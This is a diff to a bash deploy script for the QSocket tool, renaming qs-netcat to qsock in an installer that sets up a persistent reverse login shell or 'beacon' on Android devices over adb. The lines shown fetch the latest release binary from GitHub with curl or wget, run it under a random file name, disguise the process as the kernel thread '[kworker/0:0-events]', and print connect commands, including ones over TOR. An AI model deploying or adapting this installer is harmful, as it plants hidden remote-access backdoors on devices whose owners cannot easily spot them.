@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-# Install and start a permanent qs-netcat reverse login shell
+# Install and start a semi-permenant QSocket beacon
 #
 # See https://qsocket.io/deploy/ for examples.
 #
@@ -130,7 +130,7 @@ clean_exit() {
 get_latest_release_url() {
 	# For testing
 	[[ -z "$QS_UTIL" ]] && print_fatal "Binary name not set! Exiting..."
-	local API_URL="$BASE_URL/$QS_UTIL/releases/latest"
+	local API_URL="$BASE_URL/qsocket/releases/latest"
 	WGET_BIN=$(command -v wget)
 	CURL_BIN=$(command -v curl)
 	[[ ! -z $CURL_BIN ]] && curl -s "$API_URL" -o- | grep -E "/releases/download/.+${OS_NAME}_${OS_ARCH}\.tar\.gz"|cut -d'"' -f4 && return
@@ -170,9 +170,9 @@ print_usage() {
   adb -s $DEVICE_NAME shell "echo $S | $QS_PATH/$RAND_NAME --qr")
 	echo -e -n "\n"
 	echo -n ${BLUE} "# >>> Connect ============> ${RESET}" 
-	echo "qs-netcat -i -s $S"	
+	echo "qsock ssh $S"	
 	echo -n ${BLUE} "# >>> Connect With TOR ===> ${RESET}"
-	echo "qs-netcat -T -i -s $S"	
+	echo "qsock -T ssh $S"	
 	# echo -n ${BLUE} "# >>> Uninstall ==========> "
 	# echo "QS_UNDO=1 bash -c \"\$(curl -fsSL qsocket.io/x)\""
 	echo -e "\n"
@@ -212,7 +212,7 @@ list_devices() {
 }
 
 exec_hidden() {
-    adb -s $DEVICE_NAME shell -x "sh -T- -c \"QS_ARGS='-l -i -q -s $S' exec -a '$PROC_HIDDEN_NAME' $1\"" &>$ERR_LOG 
+    adb -s $DEVICE_NAME shell -x "sh -T- -c \"QS_ARGS='-lq $S' exec -a '$PROC_HIDDEN_NAME' $1\"" &>$ERR_LOG 
 }
 
 
@@ -230,7 +230,7 @@ print_banner
 # Verbose error logs
 [[ ! -z $VERBOSE ]] && ERR_LOG="`tty`"
 
-QS_UTIL="qs-netcat" # Change this!!
+QS_UTIL="qsock" # Change this!!
 RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 15)
 BASE_URL="https://api.github.com/repos/qsocket"
 PROC_HIDDEN_NAME="[kworker/0:0-events]"  # "[kworker/0:0-events]"
